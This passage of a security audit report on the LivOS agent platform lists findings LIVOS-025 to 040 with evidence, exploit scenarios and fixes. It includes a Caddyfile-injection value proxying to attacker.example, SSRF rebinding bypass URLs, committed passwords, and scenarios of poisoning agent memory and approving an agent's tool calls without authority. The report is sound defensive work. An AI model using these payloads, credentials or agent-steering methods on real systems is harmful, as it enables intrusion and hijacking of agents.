- **Description:** `requireApiKey` and `verifyApiKey` treat an unset LIV_API_KEY as "allow all": `requireApiKey` logs a warning and `next()`s with no auth, `verifyApiKey` returns true unconditionally. The `/api/*` surface — including `/api/agent/stream` which spawns the auto-approved agent (LIVOS-001..003) — is then fully unauthenticated. Per project memory LIV_API_KEY is set in prod, so this is latent; any deploy/env regression silently removes all API auth and exposes full agent RCE to anyone who can reach the port.
- **Exploit Scenario:** A deploy/systemd unit fails to inject LIV_API_KEY. `requireApiKey` `next()`s every request. An attacker reaching `liv-core:3200` POSTs `/api/agent/stream` with an arbitrary task → unauthenticated host command execution via the shell tool.
- **Evidence:**
```ts
auth.ts:183  if (!LIV_API_KEY) return true;
auth.ts:203-206  if (!LIV_API_KEY) { logger.warn('[Auth] ... running without authentication'); next(); return; }
```
- **Recommendation:** Fail closed: if LIV_API_KEY is unset, refuse to start the API server (or reject all `/api` with 503). Make the key mandatory in production config validation.
- **Verifier Note:** Verified. Genuine fail-open covering `/api/agent/stream`. Tempered to Medium by the loopback bind (`API_HOST||'127.0.0.1'`) and prod LIV_API_KEY being set — exploitable only on compounded misconfig (env drop AND network exposure).

---

### LIVOS-026 — `curl | bash` one-line installer documented with no integrity/signature check
- **Severity:** Medium — CVSS 7.0 (`AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H`)
- **Location:** `README.md:90-123`; `install.sh:81-96` (self-clone re-exec)
- **Description:** The documented install entrypoints are `curl -fsSL https://get.livinity.io | bash` and `curl -fsSL https://livinity.io/install.sh | sudo bash -s <API_KEY>`. The piped script executes (as root in the second form) directly off the network with no GPG signature, no checksum, no out-of-band verification. The script then `git clone`s the repo and re-execs with no pinning. Any compromise of `get.livinity.io` / `livinity.io` / the Vercel install.sh shim / DNS, or TLS interception, yields root RCE on install.
- **Exploit Scenario:** Attacker compromises the Vercel shim or the legacy Caddy host serving `get.livinity.io`, or hijacks DNS for `livinity.io`, and serves a modified script. Operator runs `curl ... | sudo bash` and attacker code runs as root before LivOS is even installed.
- **Evidence:**
```text
README.md:93  curl -fsSL https://get.livinity.io | bash
README.md:105 curl -fsSL https://livinity.io/install.sh | sudo bash -s <liv_k_API_KEY>
install.sh:90 git clone --depth 1 https://github.com/utopusc/livinity-io.git "$_clone_dir"   # no pin/verify, then exec
```
- **Recommendation:** Publish a detached GPG signature + SHA256 for install.sh and document a verify-then-run flow. Have install.sh's self-clone verify a signed tag before re-exec.
- **Verifier Note:** All four locations verified verbatim. The full delivery chain (DNS → Vercel/Caddy shim → GitHub raw → unpinned clone → unverified helper downloads) has zero integrity verification; canonical form runs as root. Held at Medium (not High/Critical) because the URLs use HTTPS (passive MITM blocked by TLS) — requires compromising the supply chain (Vercel route, legacy host, GitHub, rogue CA/DNS) rather than a network-only flaw; curl|bash is a widely-accepted pattern. Real defense-in-depth gap with root-RCE consequence.

---

### LIVOS-027 — openclawos approvals/handshake routes authenticate any logged-in user without role check
- **Severity:** Low — CVSS 4.3 (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N`)
- **Location:** `openclawos/approvals-routes.ts:51-68` (authenticate), `:83-87`, `:148`
- **Description:** The approvals SSE stream and resolve endpoints (which approve/deny agent tool-call executions for the openclaw gateway) gate on `authenticate()`, which only verifies the token passes `verifyToken` — any valid token (legacy `{loggedIn:true}` or any active user incl. guest/member). No `requireRole('admin')`. If multi-user mode is active with non-admin accounts, a member/guest could subscribe to pending approvals and resolve (approve) agent tool calls they should not control.
- **Exploit Scenario:** Multi-user mode with a guest. Guest connects `GET /openclawos/approvals/stream` (authenticate() returns true for any valid token), observes pending tool-call approvals, and POSTs resolutions, approving actions queued by the admin's agent session.
- **Evidence:**
```ts
authenticate(): await verifyToken(token); return true   // no role inspection
stream/resolve: const ok = await authenticate(req, opts.verifyToken); if (!ok) 401   // token validity only
```
- **Recommendation:** Require admin role on the approvals stream/resolve endpoints (resolve `currentUser` from the session JWT, enforce `role==='admin'`).
- **Verifier Note:** Confirmed. `authenticate()` does `verifyToken` only, no role check; `verifyToken` is `jwt.verify` returning the payload for ANY valid JWT. Worse than a read leak: `ApprovalManager` is a SINGLE GLOBAL instance, broadcasting every pending approval (toolCallId/toolName/args/userId) to any connected client and accepting `resolve()` from any caller. The code's own header admits "admin-only by intent" but "per-user scoping is Phase 220+." Low because exploitation needs multi-user mode ON with untrusted non-admins, and the single-operator Mini PC has it off by default; also auto-approve mode short-circuits pending events.

---

### LIVOS-028 — JWT lacks audience/issuer binding; proxy and session tokens share one secret distinguished only by a payload boolean
- **Severity:** Low — CVSS 5.0 (`CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:N`)
- **Location:** `jwt.ts:41-108` (sign/signUserToken/signProxyToken/verify/verifyProxyToken)
- **Description:** All three token types (legacy session, multi-user session, proxy) are signed with the SAME HS256 secret and differ only by a payload field (`loggedIn` vs `proxyToken`). `verify()`/`verifyProxyToken()` correctly reject the wrong type and `algorithms:['HS256']` blocks alg-confusion. But there is no `aud`/`iss` claim, so any token minted by this service is structurally interchangeable across every consumer sharing the secret. The exploit premise (apps receiving JWT_SECRET) is largely refuted below.
- **Exploit Scenario (largely refuted):** If an installed app received JWT_SECRET it could forge `{loggedIn:true,userId:<admin>,role:'admin'}` and `verify()` would accept it (no `aud`/`iss` scoping).
- **Evidence:**
```ts
verify(): jwt.verify(token, secret, {algorithms:['HS256']}) then if (payload.loggedIn !== true) throw   // no audience/issuer
app-environment.ts:34  JWT_SECRET: await livinityd.server.getJwtSecret()   // → only the trusted auth-server container
```
- **Recommendation:** Add and verify `aud`/`iss` so session JWTs are only accepted by livinityd. Use distinct secrets per token purpose. Do not hand the raw signing secret to untrusted app containers.
- **Verifier Note:** Structural facts accurate (single shared secret, no aud/iss, type by boolean). HOWEVER the forge-from-app exploit is REFUTED: both cited injection paths feed JWT_SECRET only to the trusted first-party `livos/auth-server` container (which legitimately needs it); `app-script.ts` never propagates it; the modern install path has no JWT_SECRET reference. Untrusted third-party containers do NOT receive the secret. Net: a minor defense-in-depth hardening gap. Low.

---

### LIVOS-029 — Memory service (liv/memory) fails open with no API key — unauthenticated read/write of agent memory
- **Severity:** Low — CVSS 5.3 (`CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N`)
- **Location:** `liv/packages/memory/src/auth.ts:9, 21-25`
- **Description:** Identical fail-open to liv/core: `requireApiKey` allows the request through whenever `process.env.LIV_API_KEY` is unset, logging only a `console.warn`. The memory service stores/serves agent memory. If it starts without the key, its endpoints are unauthenticated, exposing stored memory (potentially sensitive context) and allowing memory poisoning.
- **Exploit Scenario:** liv-memory.service starts without LIV_API_KEY. Any loopback-reachable client reads/writes the agent's memory store with no credential — exfiltrating past-session context or injecting poisoned "memories" to steer future agent behavior.
- **Evidence:**
```ts
requireApiKey: if (!LIV_API_KEY) { console.warn('[Memory] LIV_API_KEY not configured - authentication disabled'); next(); return; }
```
- **Recommendation:** Fail closed: return 503/refuse to start when LIV_API_KEY is absent. Share a single hardened auth helper between core and memory.
- **Verifier Note:** Confirmed; middleware mounted globally (`app.use(requireApiKey)`) guarding all data routes (only `/health` public). Mirrors liv/core. Bounded below Medium by: loopback-only bind (`MEMORY_HOST||'127.0.0.1'`), and the default prod install DOES set LIV_API_KEY via `.env` EnvironmentFile — so the fail-open branch triggers only in a degraded/inconsistent deploy. Low.

---

### LIVOS-030 — Hardcoded fallback PostgreSQL password `LivPostgres2024!` compiled into livinityd database module
- **Severity:** Low — CVSS 5.1 (`CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N`)
- **Location:** `database/index.ts:11` (DEFAULT_DATABASE_URL), used at `:54`
- **Description:** The livinityd database connector ships a hardcoded fallback `postgresql://livos:LivPostgres2024!@localhost:5432/livos`, used when `DATABASE_URL` is unset. The same literal is in `docker/docker-compose.postgres.yml:10`. Per operator memory the prod Mini PC rotated PG and overrides via `.env`, so on a healthy box this is a fallback only. PG is bound to `127.0.0.1`.
- **Exploit Scenario:** An operator deploys via the shipped `docker-compose.postgres.yml` (which uses it as the actual password) and doesn't rotate. A local process / co-located container reaching `127.0.0.1:5432` authenticates as `livos` with the repo-public password, reading/altering the users table (hashed passwords, sessions, invites).
- **Evidence:**
```ts
database/index.ts:11  const DEFAULT_DATABASE_URL = 'postgresql://livos:LivPostgres2024!@localhost:5432/livos'
database/index.ts:54  const databaseUrl = process.env.DATABASE_URL || DEFAULT_DATABASE_URL
docker/docker-compose.postgres.yml:10  POSTGRES_PASSWORD: LivPostgres2024!
```
- **Recommendation:** Remove the hardcoded password from DEFAULT_DATABASE_URL — fail loudly if DATABASE_URL is unset. Change the compose to require `POSTGRES_PASSWORD` from env (`${POSTGRES_PASSWORD:?required}`). Align with the installer's random PG password.
- **Verifier Note:** Committed-credential facts confirmed. But largely unreachable: `docker-compose.postgres.yml` is an ORPHAN (zero references in any install/deploy script) — the exploit's "operator deploys via this file" describes a flow the codebase never executes. Every actual install path generates a random PG password into `.env` DATABASE_URL, and services run under systemd with that env, so the fallback is never hit on an installed box. PG loopback-only. Real hygiene issue but no shipped path uses the literal. Low (downgraded from Medium).

---

### LIVOS-031 — Weak default DB credential `liv:liv` written into generated .env by livos/setup.sh
- **Severity:** Low — CVSS 3.3 (`CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N`)
- **Location:** `livos/setup.sh:190`
- **Description:** The secondary installer `livos/setup.sh` writes `DATABASE_URL=postgresql://liv:liv@localhost:5432/livos` into `/opt/livos/.env`, hardcoding the trivial pair `user=liv`/`password=liv`. Unlike the JWT/Redis/API secrets in the same script (openssl rand), the PG password is static and guessable. setup.sh is a legacy/alternate installer (the canonical install.sh generates a random PG password), so impact depends on whether setup.sh is used.
- **Exploit Scenario:** An operator bootstraps via `curl ... setup.sh | bash`. The resulting `.env` has password `liv`. A co-located process reaching `127.0.0.1:5432` authenticates as `liv/liv`.
- **Evidence:**
```bash
livos/setup.sh:190  DATABASE_URL=postgresql://liv:liv@localhost:5432/livos
# contrast :179-181  REDIS_PASS=$(openssl rand -hex 24); JWT_SECRET=$(openssl rand -hex 32)
```
- **Recommendation:** Generate the PG password with openssl rand like the other secrets and create/ALTER the role with it. Or deprecate setup.sh in favor of the canonical install.sh.
- **Verifier Note:** Line present and accurate; contrast with randomized peers holds. But the exploit overstates impact: setup.sh NEVER provisions PostgreSQL (no `apt install postgresql`, no `CREATE USER`), so no `liv/liv` role is ever created — PG would reject. setup.sh's UFW only opens 22+8080 (5432 loopback-only). It is dead/legacy code (single 2026-02-05 commit, points at a different repo `utopusc/livos`, retired PM2 layout). Real hygiene defect, but unused legacy + no live account. Low.

---

### LIVOS-032 — Legacy Server4 setup script hardcodes Redis password `NexusRedis2024!` in plaintext
- **Severity:** Low — CVSS 3.7 (`CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N`)
- **Location:** `liv/deploy/setup-server4.sh:23-24, 86`
- **Description:** A committed deploy script sets the Redis `requirepass` to the literal `NexusRedis2024!` and authenticates with it — a real plaintext credential in a public repo. Low because this is the deprecated Nexus-era Server4 provisioning script (Server4 is explicitly out-of-scope per operator memory) and the maintained Mini PC uses a different rotated password.
- **Exploit Scenario:** Any host ever provisioned with `setup-server4.sh` has Redis protected by the repo-public `NexusRedis2024!`; an attacker reaching it authenticates and reads/writes all keys.
- **Evidence:**
```bash
:23  sed -i 's/^# requirepass .*/requirepass NexusRedis2024!/' /etc/redis/redis.conf
:86  echo "Redis:      $(redis-cli -a NexusRedis2024! ping ...)"
```
- **Recommendation:** Delete the legacy `setup-server4.sh` (Server4 out of scope) or rewrite it to generate the password with openssl rand from env, never committing the literal.
- **Verifier Note:** Confirmed verbatim; tracked file, public repo. Not part of any maintained deploy path; the live Mini PC uses a different Redis password from `.env`. Exploit only lands on a host actually provisioned with this exact script with Redis reachable. (Line 41 similarly hardcodes `NexusDB2024!`.) Genuine committed-secret hygiene issue, limited real-world impact. Low.

---

### LIVOS-033 — At-rest credential encryption key is derived from the JWT signing secret (key reuse across security domains)
- **Severity:** Low — CVSS 3.5 (`CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N`)
- **Location:** `docker/registry-credentials.ts:25-30`; `git-credentials.ts`, `stack-secrets.ts`, `scheduler/backup-secrets.ts` share the pattern
- **Description:** Registry/git/stack credential stores encrypt at rest with AES-256-GCM (good), but the 32-byte key is `sha256(contents of /opt/livos/data/secrets/jwt)` — the SAME secret used to sign auth JWTs. This couples two domains: a leak of the JWT secret not only forges arbitrary auth tokens but ALSO decrypts every stored registry/git/stack credential. The crypto is sound (random 12-byte IV, full 16-byte GCM tag); the issue is key reuse.
- **Exploit Scenario:** The JWT secret file (or a backup) is exposed via any channel (world-readable backup, debug log, over-broad volume mount). The attacker both mints admin JWTs AND decrypts all stored docker registry passwords, git tokens, and stack secrets.
- **Evidence:**
```ts
registry-credentials.ts:27-29
  const jwt = await readFile(JWT_SECRET_PATH, 'utf-8')
  _key = crypto.createHash('sha256').update(jwt.trim()).digest() // 32 bytes for AES-256
```
- **Recommendation:** Use a dedicated data-encryption key (separate file under `data/secrets/`, generated with `crypto.randomBytes(32)`) for at-rest encryption, distinct from the JWT signing secret.
- **Verifier Note:** Verified end-to-end; identical pattern in all four stores; the same file is the auth signing secret (`getJwtSecret()`). Crypto itself sound — only key reuse widens blast radius. Low: both the JWT file and encrypted blobs live behind the same host filesystem trust boundary; an attacker who can read the JWT secret already has host access (and can read `.env`). Defense-in-depth/key-separation gap.

---

### LIVOS-034 — World-writable (0o777) scratch HOME hosts the nested operator-credential mount
- **Severity:** Low — CVSS 5.5 (`CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N`)
- **Location:** `inject-local-ai-clis.ts:248-252, 216-220`
- **Description:** `writeLocalAiCliWrappers` chmods the host-clis scratch HOME to `0o777` ("World-writable so any container uid can write CLI self-config"), and the operator credential dirs are nested-bind-mounted INSIDE that same world-writable directory. Notably, Claude Code's `~/.claude.json` (project config + MCP server list) is a FILE directly in `$HOME` and is NOT shadowed by the nested subdir mounts, so a writer can plant a poisoned config the wrapper-launched CLI then reads. The world-writable flag is a blunt substitute for proper per-container uid ownership.
- **Exploit Scenario:** A low-priv host process that can reach the app-data path writes into the `0o777 host-clis/home` dir to plant a malicious `.claude.json` that the CLI (HOME=`/opt/livos-clis/home`) reads on next invocation, redirecting the operator's authenticated CLI to attacker-controlled settings/MCP servers.
- **Evidence:**
```ts
// inject-local-ai-clis.ts:251-252
// World-writable so any container uid can write CLI self-config into $HOME.
await fse.chmod(homeDir, 0o777).catch(() => {})
// :216 home mounted rw; :219-220 creds nested inside it
```
- **Recommendation:** Do not use `0o777`. chown the scratch HOME to the specific container uid (already discovered for the ACL step) and chmod `0o700`, or use a per-app named volume. Never co-locate the credential mount parent with a world-writable directory.
- **Verifier Note:** Literal claims verified (`chmod(homeDir, 0o777)` with that comment; creds nested inside). Real vector confirmed: `~/.claude.json` lives directly in the 0o777 HOME (not shadowed), so a writer can plant poisoned MCP/settings config. Downgraded Medium→Low: each requiresLocalAiClis app gets its OWN isolated host dir (no cross-container write path), the app's own container already holds rw, and the only residual actor is a non-root local host process — thin on a single-operator Mini PC. Avoidable defense-in-depth weakness.

---

### LIVOS-035 — upstreamBearer / app daemon token interpolated UNESCAPED into the generated Caddyfile (Caddyfile-injection)
- **Severity:** Low — CVSS 4.0 (`AV:L/AC:H/PR:H/UI:R/S:C/C:L/I:L/A:L`)
- **Location:** `domain/caddy.ts:591`; `readAppDaemonToken` at `apps/apps.ts:1451-1495`
- **Description:** `registerAppSubdomain` reads a daemon token straight out of the app's `docker-compose.yml` (literal default of `${OD_API_TOKEN:-default}`) and stores it as `upstreamBearer`. The emitter inlines it as `header_up Authorization "Bearer ${sub.upstreamBearer}"` with NO escaping/validation. A token containing a double-quote + newline breaks out of the directive and injects arbitrary Caddy config written to `/etc/caddy/Caddyfile` and `caddy reload`-ed. Unlike subdomain/host (validated), the bearer is unvalidated.
- **Exploit Scenario:** A malicious app ships compose with `OD_API_TOKEN: 'foo"\n}\n:80 {\nreverse_proxy http://attacker.example\n}'`. On install the token is resolved verbatim, persisted, and emitted unescaped — injecting attacker-controlled Caddy blocks (open proxy / route hijack / TLS-on-attacker-domain) that reload silently.
- **Evidence:**
```ts
caddy.ts:591  ${sub.upstreamBearer ? `\t\theader_up Authorization "Bearer ${sub.upstreamBearer}"\n...` : ''}
apps.ts:1483  if (trimmed.length === 0) return undefined; return trimmed   // returned raw, never charset-validated
```
- **Recommendation:** Validate the token against a strict charset (`/^[A-Za-z0-9._-]+$/`) before persisting, and refuse/strip quotes/newlines/braces. Defense-in-depth: run `caddy validate` before reload and reject failing configs.
- **Verifier Note:** Confirmed real and exploitable. App-author-controlled compose is written verbatim; `readAppDaemonToken`'s only filters (`trim()`, `${VAR:-default}` unwrap, `${`-reject) are all bypassed by a plain quoted YAML scalar with internal quotes/newlines and no `${`. Stored as `upstreamBearer`, emitted unescaped, written + `caddy reload`. Low: requires the operator to install a hostile app using OD_API_TOKEN, and the public store table is curated/not auto-synced.

---

### LIVOS-036 — Custom-domain gateway is fully unauthenticated and resolves the upstream port from any matching container name substring
- **Severity:** Low — CVSS 4.3 (`AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N`)
- **Location:** `server/index.ts:160-249` (routeCustomDomain), container match `:202-206`
- **Description:** `routeCustomDomain` serves custom-domain traffic with NO auth ("Custom domain traffic is public-facing"). The appSlug→port resolution matches a container by `n.replace('/','').includes(appSlug)` — a substring match. If two containers share a name fragment, traffic can be proxied to an unintended container's published port. The proxy uses `changeOrigin:true`, so the upstream sees a clean Host and cannot distinguish the cross-routed request.
- **Exploit Scenario:** Operator maps `blog.mysite.com → 'web'`. A second container `webhook-admin` also matches substring `web`; container ordering causes `routeCustomDomain` to pick its published port, exposing an internal admin UI publicly with no auth gate.
- **Evidence:**
```ts
server/index.ts:204  c.Names.some((n) => n.replace('/', '').includes(appSlug))  // substring, not exact
server/index.ts:160  // 'Custom domain traffic is public-facing — no LivOS auth required.'
```
- **Recommendation:** Use exact container-name match only (drop the `.includes()` fallback). Pin an exact app id→port in `appMapping`. Document that custom domains are intentionally public and ensure only self-authenticating apps are mappable.
- **Verifier Note:** Verified. `.find` walks containers in Docker order; a container whose name merely CONTAINS appSlug can be selected before the exact match. Chosen container's first published port proxied with no LivOS auth. BUT the "attacker influences slug" premise is REFUTED: `appMapping` is written only by `updateAppMapping` (privateProcedure, operator-only); the subPrefix is attacker-influenceable but only indexes the operator-defined map (unknown → 503). So no external attacker introduces a colliding slug; it's contingent on operator naming collisions. Low (the finding's own rating).

---

### LIVOS-037 — Host/Origin→loopback rewrite defeats the daemon's DNS-rebinding/CSRF guard for all proxied app traffic
- **Severity:** Low — CVSS 4.7 (`AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N`)
- **Location:** `domain/caddy.ts:591` (`header_up Host 127.0.0.1:<port>`, `header_up Origin http://127.0.0.1:<port>`)
- **Description:** Commit `4830a8a8` makes the gated block rewrite Host AND Origin to loopback before proxying to the app daemon, specifically to get past the daemon's own DNS-rebinding/CSRF protection (which 403s non-loopback Host/Origin). This permanently neutralizes the daemon's last-line CSRF/rebinding defense for all gate traffic: every request looks like localhost. Combined with LIVOS-008 (presence-only gate), a forged-cookie cross-site request also bypasses the daemon's anti-CSRF Origin check.
- **Exploit Scenario:** Attacker page issues a cross-origin fetch/form to `https://open-design-bruce.livinity.io/api/active` with a forged `LIVINITY_SESSION` cookie. Caddy passes the presence-gate, injects the bearer, rewrites Origin to `http://127.0.0.1:<port>` — the daemon's Origin-based CSRF guard sees a same-origin loopback request and permits the state-changing action.
- **Evidence:**
```caddy
header_up Host 127.0.0.1:${sub.port}
header_up Origin http://127.0.0.1:${sub.port}   // unconditionally overwrites client Origin
```
- **Recommendation:** Only rewrite Host/Origin after a positive auth decision based on a validated JWT (fix LIVOS-008 first). Enforce a same-site/CSRF token at the Caddy/livinityd layer for state-changing methods, since the upstream's own Origin check is intentionally blinded.
- **Verifier Note:** Confirmed at Low. The rewrite is real/unconditional and the commit message confirms intent; it genuinely neutralizes the daemon's last-line Origin defense for all gate traffic. But the exploit is constrained: `LIVINITY_SESSION` is `SameSite=Lax` everywhere, so the cookie is NOT sent on cross-site POST/fetch/form — the headline POST-CSRF path fails the prior presence-gate. Residual exposure limited to top-level GET navigations against GET-based state-change endpoints. Code-proven defense-in-depth reduction, largely blocked by SameSite=Lax. Low.

---

### LIVOS-038 — MCP streamableHttp SSRF guard checks only the literal hostname (DNS-rebinding / IPv6-mapped bypass)
- **Severity:** Low — CVSS 5.3 (`CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:C/C:L/I:L/A:N`)
- **Location:** `liv/packages/core/src/mcp-client-manager.ts:38-49,328-347`
- **Description:** `validateUrl` blocks internal targets by regex-testing `parsed.hostname` against `BLOCKED_HOST_PATTERNS` (`127.`, `10.`, `192.168.`, `::1`, etc.). This matches only the textual hostname: a public DNS name resolving to a private/loopback IP (DNS rebinding) passes, as do IPv4-mapped IPv6 literals (`[::ffff:127.0.0.1]`) and decimal/hex IP encodings, with no re-validation of the resolved address or redirect targets. A configured MCP server URL can reach internal services (Redis 6379, livinityd, cloud metadata). Bounded because MCP configs are admin-curated.
- **Exploit Scenario:** An operator (or attacker influencing the MCP registry) adds a streamableHttp server `url=https://rebind.attacker.com` (A-record → 127.0.0.1) or `url=http://[::ffff:127.0.0.1]:6379`. The hostname regex doesn't match, the connection is allowed, and the transport hits an internal service.
- **Evidence:**
```ts
mcp-client-manager.ts:341-344  const hostname = parsed.hostname; for (const pattern of BLOCKED_HOST_PATTERNS) { if (pattern.test(hostname)) { throw ... } }
// patterns are literal-string regexes; no DNS resolution, no ::ffff: mapping, no redirect re-check
```
- **Recommendation:** Resolve the hostname and validate every resolved IP against private/loopback/link-local/ULA ranges (incl. IPv4-mapped IPv6) before connecting, pin the resolved IP for the connection, and disallow redirects to disallowed hosts.
- **Verifier Note:** Verified. Only the literal `parsed.hostname` is checked; no DNS resolution, no `::ffff:` normalization, no decimal/hex canonicalization, no redirect re-validation. All three bypasses genuine. All `mcp.config.*` mutate routes are `adminProcedure`-gated, so the malicious URL must come from an admin or someone influencing the admin-curated registry — Low.

---

### LIVOS-039 — `share-password` secret file is mode 644 (group/world readable bit set)
- **Severity:** Low — CVSS 3.3 (`CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N`)
- **Location:** Live: Mini PC `/opt/livos/data/secrets/share-password` (perms 644); writer `files/samba.ts:125`
- **Description:** The app-share password secret is stored mode 644 while siblings (`jwt`, `openclaw-ed25519`) are correctly 600. In the current layout the parent chain (`/opt/livos` 700, `secrets` 700) blocks traversal, so exposure is latent, not live. It becomes a real leak the moment a parent dir permission is loosened (common during ownership/perm fixes) or the file is copied/synced, and inside any container that mounts `/opt/livos/data`. A clear inconsistency with the 600 secrets policy.
- **Exploit Scenario:** A future perms change (or a `/data` container mount) makes `secrets` reachable by a non-bruce principal; because `share-password` is 644 not 600, that principal reads the 32-char share secret and can forge/validate app-share links.
- **Evidence:**
```text
$ ls -la /opt/livos/data/secrets/
-rw-------  bruce bruce jwt
-rw-------  bruce bruce openclaw-ed25519
-rw-r--r--  bruce bruce share-password   <-- 644
```
- **Recommendation:** `chmod 600 /opt/livos/data/secrets/share-password`. Have the writer (`samba.ts`) create it `0600` like the others (add `{mode: 0o600}`).
- **Verifier Note:** Confirmed defense-in-depth/policy gap. `samba.ts:125` `fse.writeFile(sharePasswordFile, sharePassword)` omits `mode` → defaults 0o644 under umask 022, matching the live stat. Essentially every other secret path enforces 0o600 (jwt, openclaw, device-id, registry/git creds) — share-password is the lone exception. Exploitability is genuinely LATENT (parent dirs 700 block access today). One sub-claim (a container mounting `/opt/livos/data`) is unproven in the repo. Trivial fix. Low.

---

### LIVOS-040 — update.sh auto-installs a broad apt package set every run with no version pinning
- **Severity:** Info — CVSS 4.4 (`AV:L/AC:H/PR:H/UI:N/S:U/C:L/I:L/A:L`)
- **Location:** `update.sh:354-383`
- **Description:** Every update.sh run does `apt-get install -y -qq` on a large unpinned set (x11vnc, ydotool, ffmpeg, gstreamer*, websockify, xserver-xephyr, gnome-terminal, etc.) pulling current versions. No version pinning, no integrity beyond apt's signing. This widens the trusted-input surface (a compromised/attacker-added apt source would install as root on every update) and makes deploys non-reproducible.
- **Exploit Scenario:** If an attacker can add or compromise an apt source on the host (via an earlier foothold), update.sh's unconditional install gives them a reliable root-code-execution trigger on the next update and silently upgrades these packages to attacker-influenced versions.
- **Evidence:**
```bash
DEBIAN_FRONTEND=noninteractive apt-get install -y -qq \
  x11vnc xdotool ydotool maim scrot gnome-screenshot websockify ffmpeg \
  gstreamer1.0-tools gstreamer1.0-plugins-{good,bad,ugly} xdg-desktop-portal-gnome \
  xvfb fluxbox feh tint2  2>&1 | tail -5 || warn ...
```
- **Recommendation:** Move dependency install to the one-time install.sh phase rather than every update; pin package versions or use a curated, integrity-checked source list; skip when binaries are already present (the verify loop already detects them).
- **Verifier Note:** Code confirmed verbatim. Impact minimal: the exploit requires an attacker to ALREADY be able to add/compromise an apt source (root or root-equivalent persistence) — amplification of an existing compromise, not a new boundary crossed. The package list is a hardcoded literal (no untrusted input). Genuine non-reproducibility / trusted-input-surface concern but no standalone exploit absent a pre-existing root foothold → Info.

---

## Remediation Roadmap

### Immediate (Critical / High) — do this week
- [ ] **LIVOS-003 / 013 / 007 / 022:** Strip `privileged: true`, `cap_add`, `network_mode: host`, `pid: host`, and any `/var/run/docker.sock` or out-of-app-data host-path bind from ALL non-builtin app compose (`compose-generator.ts`, `installForUser`, and the global `install()` path). Add `caddy validate`-style YAML pre-parse rejection. Remove the live OpenHands `docker.sock` mount and put it behind a socket-proxy.
- [ ] **LIVOS-007 / 013 / 024:** Gate `addRepository`/`removeRepository` and install-of-new-apps behind `adminProcedure` + a verified-repo allowlist. Apply the existing `webapps/url-validator.ts isPrivateHost()` guard to `AppRepository`.
- [ ] **LIVOS-001 / 017 / 034:** Stop bind-mounting operator `~/.claude`/`~/.gemini` into app containers. Build a host-side credential broker (reuse the `requiresAiProvider` model); if interim, mount `:ro` + scoped revocable tokens, drop the `0o777` HOME, restrict `requiresLocalAiClis` to `verified` catalog apps, and ship a real consent prompt.
- [ ] **LIVOS-002 / 009:** Mark `shell`/`files`/`docker_*`/`pm2` `requiresApproval:true` and enforce via the SDK `canUseTool` callback (replace `permissionMode:'dontAsk'`). Sandbox the `files` tool with `isPathAllowed` (per-user dirs; deny `.env`, `secrets/`, home creds).
- [ ] **LIVOS-004 / 005 / 006:** Make auth fail closed — THROW on inactive/deleted users; never treat "no currentUser" as admin (use an explicit boot flag); wire the `sessions` table (or `token_version`/`password_changed_at`) so deactivation/password-change revokes JWTs; make `/api/files` reject userId-less requests in multi-user mode instead of falling to the admin tree.
- [ ] **LIVOS-008 / 015:** Replace the cookie-presence gate with `forward_auth` to a livinityd `/auth/verify` JWT check (or route gated subdomains through `:8080`). Bind livinityd to loopback/overlay and tighten the UFW `8080/tcp ALLOW Anywhere` rule to the ZeroTier/Tailscale ranges.
- [ ] **LIVOS-014:** Make `requireApiKey` fail closed; have `env-seed.sh` always generate `LIV_API_KEY` on every install path.
- [ ] **LIVOS-011 / 012 / 016:** Pin + GPG-verify the update ref before rsync/build/restart. Stop `import()`-ing untrusted skill `index.js` in-process; sandbox or restrict to a signed official registry.

### Short-term (Medium)
- [ ] **LIVOS-018 / 019 / 025:** Single fail-closed auth helper for liv-core + memory; mandatory LIV_API_KEY in prod config validation.
- [ ] **LIVOS-020 / 021 / 030:** Remove hardcoded `LivRedis2024!` (derive from REDIS_URL), `LivPlatform2024` (require DATABASE_URL + rotate), and the `LivPostgres2024!` fallback (+ orphan compose).
- [ ] **LIVOS-023:** Move app subdomains to dot-children or issue per-host gate tokens; set `__Host-` cookie scope.
- [ ] **LIVOS-026:** Publish a detached GPG signature + SHA256 for install.sh; document verify-then-run.

### Hardening (Low / Info)
- [ ] **LIVOS-027:** Require admin role on openclawos approvals stream/resolve.
- [ ] **LIVOS-028 / 033:** Add `aud`/`iss` to JWTs; use a dedicated at-rest encryption key separate from the JWT secret.
- [ ] **LIVOS-029:** Fail-closed memory service auth.
- [ ] **LIVOS-031 / 032:** Delete/rewrite legacy `setup.sh` and `setup-server4.sh` to drop committed creds.
- [ ] **LIVOS-035:** Charset-validate `OD_API_TOKEN` before Caddyfile emit + `caddy validate` pre-reload.
- [ ] **LIVOS-036:** Exact container-name match in `routeCustomDomain`.
- [ ] **LIVOS-037:** Rewrite Host/Origin only after a validated-JWT auth decision; add a CSRF token for state-changing methods.
- [ ] **LIVOS-038:** Resolve + validate every IP (incl. IPv4-mapped IPv6) in the MCP SSRF guard; pin the resolved IP; block redirects.
- [ ] **LIVOS-039:** `chmod 600 share-password` + fix the `samba.ts` writer to `{mode: 0o600}`.
- [ ] **LIVOS-040:** Move apt install to the one-time install phase; pin versions.

---

## Methodology & Scope Notes

**Covered:**
- Static review of the `livinity-io` repo: livinityd (auth/JWT/RBAC, tRPC routes, file API, app install/compose pipeline, Caddy/domain gateway, computer-use/luse tools, secrets handling), liv core/memory (agent runners, tool registry, API auth, skill marketplace, MCP client, heartbeat), the platform tier (`platform/web`, `platform/relay`), and the install/update/setup shell scripts.
